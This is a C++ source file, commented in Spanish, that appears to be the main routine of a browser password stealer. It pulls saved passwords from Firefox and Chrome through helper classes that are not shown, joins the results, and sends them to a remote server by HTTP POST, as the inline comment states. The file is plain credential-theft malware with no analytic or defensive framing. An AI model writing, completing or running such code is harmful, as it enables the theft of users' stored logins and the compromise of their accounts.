#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <string>
#include <cstdio>
#include <Wincrypt.h>
#include <fstream>
#include <tlhelp32.h>
#include <time.h>
#include <wininet.h>
#include "Firefox.h"
#include "chrome.h"
#include "Recursos.h"
#include <iostream>



#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "wininet.lib")


#include <windows.h>
#include <Tlhelp32.h> 
#include <stdio.h>

using namespace std;


void main(){
	Recursos recursos;

	//cout << " ------------------------- Mozilla Firefox ------------------------- " << endl;
	Firefox firefox;
	char *path = firefox.rutaInstalado();
	char *info_firefox;
	if (firefox.loadFunctions(path)){
		//std::cout << "loadFunctions(path)" << endl;
		info_firefox = firefox.getContrase�as();
		free(path);
	} else {
		//std::cout << "Firefox no esta instalado" << std::endl;
		info_firefox = "Firefox no esta instalado";
	}
	
	//cout << " ------------------------- Google Chrome ------------------------- " << endl;
	Chrome chrome;
	char* rutaBD = chrome.getRutaBD(); 
	char* info_chrome = chrome.getContrase�as(rutaBD);

	char* info = recursos.dupcat(info_firefox, info_chrome, 0);
	recursos.enviarPost(info); // enciar post a servidor con la informaci�n sacada de firefox y chrome
	

}